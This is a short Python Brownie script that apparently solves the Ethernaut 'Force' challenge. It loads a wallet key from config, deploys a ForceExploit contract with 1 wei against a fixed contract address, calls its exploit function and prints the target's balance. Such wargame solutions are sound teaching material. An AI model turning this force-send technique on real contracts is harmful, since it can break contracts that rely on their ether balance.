from brownie import Force, ForceExploit, config, accounts, network

InstanceAddress = "0x0A5a7918EB67B632D5b27A4fb94dDa56e3e61C55"
player = accounts.add(config["wallets"]["from_key"]) 
def main():
    force = Force.at(InstanceAddress)
    forceExploit = ForceExploit.deploy(InstanceAddress, {"from": player, "value": 1})
    forceExploit.exploit()
    print(f"Force contract balance is {force.balance()}")